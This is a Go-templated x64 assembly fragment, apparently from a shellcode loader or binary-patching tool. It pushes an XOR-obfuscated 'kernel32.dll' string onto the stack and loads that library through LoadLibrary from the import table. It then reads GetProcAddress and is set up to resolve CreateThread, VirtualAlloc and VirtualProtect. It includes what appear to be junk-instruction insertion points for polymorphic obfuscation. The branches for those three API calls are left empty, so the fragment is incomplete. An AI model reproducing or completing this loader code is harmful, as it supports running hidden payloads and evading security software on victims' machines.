.code64

// find CreateThread, VirtualAlloc and VirtualProtect
{{if .LackProcedure}}

// push kernel32.dll\0 to stack
mov {{.Reg.rax}}, {{index .Kernel32 0}}         {{is}}
xor {{.Reg.rax}}, {{index .Kernel32Key 0}}      {{is}}
push {{.Reg.rax}}                               {{is}}
mov {{.Reg.rbx}}, {{index .Kernel32 1}}         {{is}}
xor {{.Reg.rbx}}, {{index .Kernel32Key 1}}      {{is}}
push {{.Reg.rbx}}                               {{is}}

{{if .LoadLibraryWOnly}}
mov {{.Reg.rcx}}, {{index .Kernel32 2}}         {{is}}
xor {{.Reg.rcx}}, {{index .Kernel32Key 2}}      {{is}}
push {{.Reg.rcx}}                               {{is}}
mov {{.Reg.rdx}}, {{index .Kernel32 3}}         {{is}}
xor {{.Reg.rdx}}, {{index .Kernel32Key 3}}      {{is}}
push {{.Reg.rdx}}                               {{is}}
{{end}}

// read the LoadLibraryA/W form IAT
mov {{.RegS.rbx}}, [rip + 0xFF112200]
// load kernel32.dll
mov rcx, rsp
sub rsp, 0x20
call {{.RegS.rbx}}
add rsp, 0x20

// store DLL handle in stable register
mov {{.RegS.rbx}}, rax

// restore stack
{{if .LoadLibraryWOnly}}
add rsp, 4*8
{{else}}
add rsp, 2*8
{{end}}

// read the GetProcAddress form IAT
mov {{.Reg.rax}}, [rip + 0xFF112201]

{{if .LackCreateThread}}

{{else}}

{{end}}

{{if .LackVirtualAlloc}}

{{else}}

{{end}}

{{if .LackVirtualProtect}}

{{else}}

{{end}}

{{end}}

